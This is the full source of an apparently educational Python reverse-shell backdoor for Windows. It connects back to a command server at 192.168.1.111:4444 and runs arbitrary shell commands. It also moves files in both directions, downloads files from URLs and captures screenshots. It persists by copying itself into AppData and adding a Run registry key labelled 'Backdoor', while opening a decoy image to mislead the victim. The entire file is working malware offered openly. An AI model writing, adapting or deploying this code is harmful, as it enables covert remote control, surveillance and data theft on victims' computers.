#!/usr/bin/python

import socket
import subprocess
import json
import os
import base64
import shutil
import time
import requests
import sys
from mss import mss


# send data
def sending(data):
    json_data = json.dumps(data)
    s.send(json_data)

# receiving data
def receiving():
    data = ""
    while True:
        try:
            # controlling data processing
            data = data + s.recv(2048)
            # return data to the shell function
            return json.loads(data)
        except ValueError:
            # continue the loop if the data sent is bigger than 1024
            continue

# this will try to connect to the server every 5 secs without crashing
def connection():
    while True:
        time.sleep(5)
        try:
            # setting the server IP/Port for making the reverse shell
            s.connect(("192.168.1.111",4444))
            # interacting with C&C
            shell()
        except Exception as e:
            connection() # recursive function

# check if running as an administrator or not
def is_admin():
    global admin
    try:
        # list directory -> get certain directory from the AppData
        temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\\windows'), 'temp']))
    except Exception as e:
        admin = "[!] User privileges"
    else:
        admin = "[+] Admin privileges"

# download resources from the internet
def download(url):
    response = requests.get(url)
    file = url.split("/")[-1] # grabbing the last part of the URL (whatever it downloaded)
    # opening file
    with open(file, "wb") as file:
        file.write(response.content) # grabbing the download

def shell():
    while True:
        command = receiving()
        if command == "q":
            break
        elif command == "help":
            help_opts = '''
                download <path> - Download a file from Target PC
                upload <path> - Upload a File to Target PC
                get <url> - Download a FIle To Target PC From Any Website
                start <path> - Start a program without waiting on a single program to close before continuing (like parallel running)
                screenshot - Take A Screenshot of Target Monitor
                check - Check for Admin Privileges
                q - Exiting the Reverse Shell
            '''
            sending(help_opts)
        elif command[:2] == "cd" and len(command) > 1:
            try:
                # changing directory if command "cd" is executed
                os.chdir(command[3:]) # cd Desktop - this takes Desktop only
            except Exception as e:
                continue
        elif command[:8] == "download":
            # after download
            with open(command[9:], "rb") as file: # read
                sending(base64.b64encode(file.read()))
        elif command[:6] == "upload":
            with open(command[7:], "wb") as file: # writing the file we are receiveing
                data = receiving() # encoding file to base64
                file.write(base64.b64decode(data))
        elif command[:3] == "get":
            try:
                download(command[4:])
                sending("[+] Downloaded file from URL")
            except Exception as e:
                sending("[!] Failed to download")
        elif command[:10] == "screenshot":
            try:
                screenshot = mss()
                filename = screenshot.shot()
                # monitor-1 is the file that will output the mss pakage
                with open("monitor-1.png","rb") as ss:
                    # sending
                    sending(base64.b64encode(ss.read()))
                # inmediate deleting
                os.remove("monitor-1.png")
            except Exception as e:
                sending("[!] Screenshot Failed")
        elif command[:5] == "start":
            try:
                subprocess.Popen(command[6:], shell=True)
                sending("[+] Started")
            except Exception as e:
                sending("[!] Failed to start")
        elif command[:5] == "check":
            try:
                is_admin()
                sending(admin)
            except Exception as e:
                sending("[!] Unable to check")
        else:
            processing = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = processing.stdout.read() + processing.stderr.read()
            sending(result)

if __name__ == "__main__":
    # find the AppData path and add existance to it
    location = os.environ["appdata"] + "\\win32.exe"
    # check if location exists
    if not os.path.exists(location):
        # copying current executable to location
        shutil.copyfile(sys.executable, location)
        # adding a registry key to the machine
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
        # opens an image once - importing image (temp folder for Pyinstaller)
        image = sys._MEIPASS + "\image.png"
        try:
            subprocess.Popen(image, shell=True)
        except Exception as e:
            pass
    # ICP Ipv4 socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection()
    s.close()
